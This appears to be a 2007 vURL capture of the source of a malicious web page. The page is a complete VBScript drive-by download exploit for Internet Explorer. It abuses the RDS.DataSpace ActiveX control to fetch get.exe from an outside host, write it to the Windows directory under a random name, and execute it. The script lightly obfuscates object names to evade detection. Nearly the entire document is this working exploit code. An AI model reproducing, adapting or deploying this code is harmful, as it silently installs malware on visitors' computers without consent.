*****************************************************************
vURL Desktop Edition v0.1.1 Results
Source code for: http://werew0lf.net/gurusoft/ru-soft/sources/exploits/ie_vb1.php?exeurl=aHR0cDovL3dlcmV3MGxmLm5ldC9ndXJ1c29mdC9ydS1zb2Z0L2dldC5leGU=
Server IP: 209.67.219.34
Date: 05 January 2007
Time: 00:11:05:11
*****************************************************************
<script language="VBScript">
Module_Path="http://werew0lf.net/gurusoft/ru-soft/get.exe"
   If navigator.appName="Microsoft Internet Explorer" Then
            
      If InStr(navigator.platform,"Win32") <> 0  Then
      
      Const ssfFONTS=20
      Const adModeReadWrite=3
      Const adTypeBinary=1 
      Const adSaveCreateOverWrite=2 
       
      Dim  oRDS
      Dim  oXMLHTTP
      Dim  oFSO
      Dim  oStream
      Dim  oWShell
      Dim  oShellApp 
      
      Dim  WinDir
      Dim  ExeName
      Dim  XMLBody
      Dim  PluginFile
      Dim  cByte
      Dim   ObjName
      Dim   ObjProg
      
      Randomize

      ExeName=GenerateName()
      ExeName=ExeName & ".exe"
 
      Set  oRDS=document.createElement("object") 
      oRDS.setAttribute "id","oRDS"
      oRDS.setAttribute "classid","clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"
      
      Set oShellApp = oRDS.CreateObject("Shell.Application","")
      Set oFolder = oShellApp.NameSpace(ssfFONTS)
      Set oFolderItem=oFolder.ParseName("Symbol.ttf")
      Font_Path_Components=Split(oFolderItem.Path,"\",-1,1)
      WinDir= Font_Path_Components(0) & "\" &  Font_Path_Components(1) & "\"
      ExeName=WinDir & ExeName
                  
      ObjName="Microsoft"
      ObjProg="XMLHTTP"
      set oXMLHTTP = CreateObject(ObjName & "." & ObjProg)
      Req_type="G" & "E" & "T"
      HTTPSession=oXMLHTTP.Open(Req_Type,Module_Path,0)
      oXMLHTTP.Send() 
      On Error Resume Next
      XMLBody=oXMLHTTP.responseBody
     
      ObjName="ADODB"
      ObjProg="Stream"
      On Error Resume Next
      Set oStream=oRDS.CreateObject(ObjName & "." & ObjProg,"")
      If Err.number <> 0 Then
         
            Set oFSO=oRDS.CreateObject("Scripting.FileSystemObject","")
            Set PluginFile=oFSO.CreateTextFile(ExeName, TRUE)
            Plugin_size=LenB(XMLBody)

            For j=1 To Plugin_size 
                cByte=MidB(XMLBody,j,1)
                ByteCode=AscB(cByte)
                PluginFile.Write(Chr(ByteCode))
            Next
            PluginFile.Close
       
            Set  oWShell=oRDS.CreateObject("WScript.Shell","")
            On Error Resume Next
            oWShell.Run (ExeName),1,FALSE
      Else
            oStream.Mode=adModeReadWrite
            oStream.Type=adTypeBinary 
            oStream.Open 
            oStream.Write XMLBody 
            oStream.SaveToFile ExeName,adSaveCreateOverWrite
            
            oShellApp.ShellExecute ExeName
      End If
            
            
      End If
   End If   
   
Function GenerateName()
RandomName=""
rr=Int(8*Rnd)
ik=0
Do
  ii=Int(25*Rnd)+97
  RandomName=RandomName+Chr(ii)
  ik=ik+1
Loop While ik<rr
GenerateName=RandomName
End Function
</script>
